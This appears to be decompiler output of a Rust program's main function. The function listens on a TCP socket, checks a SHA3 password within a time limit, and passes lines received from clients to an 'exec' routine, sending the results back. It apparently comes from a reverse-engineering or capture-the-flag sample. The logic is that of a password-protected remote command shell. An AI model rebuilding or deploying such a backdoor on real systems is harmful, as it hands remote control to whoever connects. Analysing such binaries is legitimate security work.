void harry::main()
{
    unsigned int v0;  // [bp-0x170]
    unsigned int v1;  // [bp-0x16c]
    char *v2;  // [bp-0x168], Other Possible Types: unsigned long long
    unsigned int v3;  // [bp-0x15c]
    unsigned long long v4;  // [bp-0x158]
    int v5;  // [bp-0x150]
    unsigned long long v6;  // [bp-0x148]
    char *v7;  // [bp-0x140], Other Possible Types: unsigned long long
    unsigned long long v8;  // [bp-0x138]
    char *v9;  // [bp-0x110]
    unsigned long long v10;  // [bp-0x108]
    unsigned long long v11;  // [bp-0x100]
    unsigned long long v12;  // [bp-0xf8]
    unsigned long long v13;  // [bp-0xf0]
    unsigned long long v14;  // [bp-0xe8]
    int v15;  // [bp-0xe8]
    char v16;  // [bp-0xe8]
    unsigned long long v17;  // [bp-0xe0]
    unsigned long long v18;  // [bp-0xd8]
    uint128_t v19;  // [bp-0xd0]
    unsigned long long v20;  // [bp-0xb8]
    unsigned long long v21;  // [bp-0xb0]
    unsigned long long v22;  // [bp-0xa8]
    unsigned int v23;  // [bp-0xa0]
    unsigned long long v24;  // [bp-0x98]
    int v25;  // [bp-0x98]
    int v26;  // [bp-0x88]
    char v27;  // [bp-0x70]
    unsigned long long v28;  // [bp-0x60]
    unsigned int v29;  // [bp-0x58]
    unsigned int v30;  // [bp-0x54]
    int v31;  // [bp-0x50]
    int v32;  // [bp-0x40]
    unsigned long long v33;  // [bp-0x30]
    unsigned long long v34;  // [bp-0x28]
    unsigned long long v35;  // [bp-0x20]
    unsigned long long v36;  // [bp-0x18]
    unsigned long long v37;  // [bp-0x10]
    unsigned long long v39;  // r15
    unsigned long long v40;  // r14
    unsigned long long v41;  // r13
    unsigned long long v42;  // r12
    unsigned long long v43;  // rbx
    unsigned int v44;  // edx
    unsigned long long v45;  // rcx

    v37 = v39;
    v36 = v40;
    v35 = v41;
    v34 = v42;
    v33 = v43;
    v7 = &g_474000;
    v8 = <&T as core::fmt::Display>::fmt;
    v16.new_v1(&g_474010, 1, &v7, 1);
    alloc::fmt::format(&v27, &v16);
    v20 = *((long long *)&v27);
    v21 = v28;
    v22 = std::time::Instant::now();
    v23 = v44;
    while (true)
    {
        v7 = &v20;
        v8 = <&T as core::fmt::Display>::fmt;
        v16.new_v1(&g_474020, 2, &v7, 1);
        std::io::stdio::_print(&v16);
        std::net::each_addr(&v16, v20, v21, v45);
        v7.map(&v16);
        v0 = v7.expect();
        v14 = &g_474058;
        v17 = 1;
        v18 = "/rustc/1b198b3a196442e14fb06978166ab46a4618d131/library/core/src/fmt/mod.rsassertion failed: mid <= self.len()called `Result::unwrap()` on an `Err` value/root/.cargo/registry/src/index.crates.io-6f17d22bba15001f/sha3-0.10.8/src/state.rs7869";
        v19 = 0;
        std::io::stdio::_print(&v14);
        v29.accept(&v0);
        if (v29)
        {
            v24 = (long long)v31;
            v7 = &v24;
            v8 = <std::io::error::Error as core::fmt::Display>::fmt;
            v14.new_v1(&g_4740e8, 2, &v7, 1);
            std::io::stdio::_print(&v14);
            ::0x40af10::core::ptr::drop_in_place<std::io::error::Error>(&v24);
            core::ptr::drop_in_place<std::net::tcp::TcpStream>(v0);
        }
        else
        {
            v1 = v30;
            v26 = v32;
            v25 = v31;
            v7 = &v25;
            v8 = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
            v14.new_v1(&g_474068, 2, &v7, 1);
            std::io::stdio::_print(&v14);
            v3 = 0;
            if (((char)v3 & 1))
            {
                do
                {
                    while (true)
                    {
                        v7.with_capacity(0x2000, &v1);
                        v4 = 1;
                        *((uint128_t *)&v5) = 0;
                        std::io::append_to_string(&v12, &v4, &v7);
                        if (v12)
                            break;
                        if (!v13)
                            goto LABEL_40c430;
                        v4.pop();
                        v18 = v6;
                        *((int128_t *)&v15) = *((int128_t *)&v4);
                        harry::exec(&v9, &(unsigned long long)v15);
                        (unsigned long long)v15.write(&v1, v9, v11);
                        ::0x40b2e0::core::ptr::drop_in_place<core::result::Result<usize,std::io::error::Error>>(&(unsigned long long)v15);
                        core::ptr::drop_in_place<alloc::string::String>(&v9);
                        core::ptr::drop_in_place<std::io::buffered::bufreader::BufReader<&[u8]>>(v7, v8);
                    }
                    v2 = v13;
                    v9 = &v2;
                    v10 = <std::io::error::Error as core::fmt::Display>::fmt;
                    v14.new_v1(&g_4740e8, 2, &v9, 1);
                    std::io::stdio::_print(&v14);
                    ::0x40af10::core::ptr::drop_in_place<std::io::error::Error>(&v2);
LABEL_40c1f0:
                    core::ptr::drop_in_place<alloc::string::String>(&v4);
                    core::ptr::drop_in_place<std::io::buffered::bufreader::BufReader<&[u8]>>(v7, v8);
                } while (((char)v3 & 1));
            }
            v7.with_capacity(0x2000, &v1);
            v4 = 1;
            *((uint128_t *)&v5) = 0;
            std::io::append_to_string(&v12, &v4, &v7);
            if (!(!v12))
                continue;
            if (!v13)
                goto LABEL_40c430;
            v4.pop();
            v14 = &g_4740a8;
            v17 = 1;
            v18 = "/rustc/1b198b3a196442e14fb06978166ab46a4618d131/library/core/src/fmt/mod.rsassertion failed: mid <= self.len()called `Result::unwrap()` on an `Err` value/root/.cargo/registry/src/index.crates.io-6f17d22bba15001f/sha3-0.10.8/src/state.rs7869";
            v19 = 0;
            std::io::stdio::_print(&v14);
            if ((char)harry::verify_sha3(1, v6) && (char)v22.elapsed().partial_cmp(v44, 1, 0) != 255)
            {
                v14 = &g_4740d8;
                v17 = 1;
                v18 = "/rustc/1b198b3a196442e14fb06978166ab46a4618d131/library/core/src/fmt/mod.rsassertion failed: mid <= self.len()called `Result::unwrap()` on an `Err` value/root/.cargo/registry/src/index.crates.io-6f17d22bba15001f/sha3-0.10.8/src/state.rs7869";
                v19 = 0;
                std::io::stdio::_print(&v14);
                v14.write(&v1, "Authenticated!\nError: ", 15);
                v3 = (unsigned int)(unsigned long long)::0x40b2e0::core::ptr::drop_in_place<core::result::Result<usize,std::io::error::Error>>(&v14) & 0xffffff00 | 1;
                goto LABEL_40c1f0;
            }
            else
            {
                v22 = std::time::Instant::now();
                v23 = v44;
                v2 = &v4;
                v9 = &v2;
                v10 = <&T as core::fmt::Display>::fmt;
                v14.new_v1(&g_4740b8, 2, &v9, 1);
                std::io::stdio::_print(&v14);
                goto LABEL_40c1f0;
            }
LABEL_40c430:
            v9 = &v25;
            v10 = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
            v14.new_v1(&g_474088, 2, &v9, 1);
            std::io::stdio::_print(&v14);
            core::ptr::drop_in_place<alloc::string::String>(&v4);
            core::ptr::drop_in_place<std::io::buffered::bufreader::BufReader<&[u8]>>(v7, v8);
            core::ptr::drop_in_place<std::net::tcp::TcpStream>(v1);
            core::ptr::drop_in_place<std::net::tcp::TcpStream>(v0);
        }
    }
}
